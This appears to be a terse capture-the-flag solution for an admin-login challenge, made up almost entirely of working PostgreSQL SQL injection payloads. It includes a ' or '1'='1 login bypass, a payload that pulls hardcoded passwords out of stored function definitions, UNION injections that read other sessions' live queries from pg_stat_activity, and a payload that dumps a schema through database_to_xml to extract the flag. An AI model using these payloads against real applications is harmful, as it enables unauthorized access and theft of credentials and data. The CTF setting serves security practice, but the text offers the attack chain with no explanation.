# Welcomne admin 

## 1/2
```sql
' or '1' = '1
```

## 2/2

### Super Admin
```sql
WITH TEST AS (
    SELECT pg_get_functiondef(f.oid) AS function_definition
    FROM pg_catalog.pg_proc f
    INNER JOIN pg_catalog.pg_namespace n ON (f.pronamespace = n.oid)
    WHERE n.nspname = 'public'
)
SELECT split_part(split_part(function_definition, '_password = ''', 2), ''' THEN', 1) AS split_result
FROM TEST;
```

Full combo:
```sql
' || (WITH TEST AS (SELECT pg_get_functiondef(f.oid) AS function_definition FROM pg_catalog.pg_proc f INNER JOIN pg_catalog.pg_namespace n ON (f.pronamespace = n.oid) WHERE n.nspname = 'ctf') SELECT split_part(split_part(function_definition, '_password = ''', 2), ''' THEN', 1) AS split_result FROM TEST) || '
```

### Hyper admin
```sql
' union select '', split_part(split_part(query, 'SELECT ''', 2), ''', '''' union', 1) from pg_stat_activity where state='active
```

### Turbo admin
```sql
' union select split_part(split_part(query, 'select ''', 2), ''', '''' union', 1), split_part(split_part(query, 'select ''', 2), ''', '''' union', 1) from pg_stat_activity where usename='ctf
```

### Flag
```sql
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz' union all SELECT unnest(xpath('postgres/ctf/' || (SELECT tt.tablename FROM pg_catalog.pg_tables tt where schemaname='ctf') || '/' || ((SELECT column_name FROM information_schema.columns WHERE table_schema = 'ctf' AND table_name = (SELECT tt.tablename FROM pg_catalog.pg_tables tt where schemaname='ctf') order by column_name limit 1)) || '/text()', database_to_xml(true,true,'')))::text order by 1 asc --
```